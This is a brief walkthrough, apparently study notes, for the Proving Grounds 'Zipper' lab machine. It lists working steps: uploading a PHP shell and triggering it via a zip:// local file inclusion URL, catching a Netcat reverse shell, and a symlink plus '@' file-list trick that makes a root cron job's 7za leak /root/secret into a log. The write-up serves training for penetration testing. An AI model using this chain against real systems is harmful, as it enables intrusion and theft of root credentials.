
# 🧪 Zipper Walkthrough (Linux)

[Walkthrough Source](https://medium.com/@ardian.danny/oscp-practice-series-62-proving-grounds-zipper-b49a52ed8e38)

---

## 🚪 Initial Foothold

- Found port **80** open.
- Web interface allows uploading files to compress into ZIP.
- Uploaded `shell.php` file.
- Used **LFI (Local File Inclusion)** to trigger the shell:

  ```
  http://192.168.186.229/index.php?file=zip://uploads/upload_1752751124.zip#shell
  ```

- Setup a Netcat listener to receive reverse shell.

---

## 🧗‍♂️ Privilege Escalation

- Discovered **cron job** and **suspicious 7za activity** using `linpeas.sh` and `pspy32s`:

  ```
  CMD: /usr/lib/p7zip/7za a /opt/backups/backup.zip -p****************** -tzip ...
  CMD: bash /opt/backup.sh
  ```

- Inspected `/opt/backup/backup.log` and found it leaking the **root password** due to how the cron script runs.

---

## 💥 Exploit Chain

1. Cron script reads `/root/secret`:
   ```bash
   password=$(cat /root/secret)
   7za a /opt/backups/backup.zip -p$password ...
   ```

2. The full command including the password is logged.

3. Exploit steps:
   ```bash
   ln -s /root/secret gg.zip
   touch @gg.zip
   ```

   > This tricks `7za` to read `/root/secret` when building the backup.

4. Wait for cron to execute, then check the password in `/opt/backup/backup.log`.

---

## 🧠 Notes

- `7za` treats files prefixed with `@` as file lists.
- Symbolic links can bypass permissions if another process with higher privileges accesses them.
